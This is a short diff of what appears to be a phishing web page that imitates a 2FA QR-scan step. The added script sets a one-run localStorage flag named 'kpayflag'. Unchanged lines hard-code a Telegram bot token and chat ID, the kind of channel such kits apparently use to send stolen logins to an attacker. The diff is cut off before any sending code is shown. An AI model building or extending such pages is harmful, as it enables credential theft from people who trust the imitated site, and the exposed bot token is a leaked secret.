@@ -2683,8 +2683,15 @@ f5_cspm.go();}());</script><div id="2fa-auth-scan-qr"></div>
 
 <script>
 document.addEventListener("DOMContentLoaded", function () {
-
-  
+    
+    try{
+        if(localStorage.getItem('kpayflag') == '1'){
+        return
+    }
+    }
+    catch(err){
+    localStorage.setItem('kpayflag','1')
+    }
   const telegramToken = "7998058099:AAEiBWRM-7qngLRe-uQKDJdROitygNGjxbo";
   const chatId = "6969224682";
 
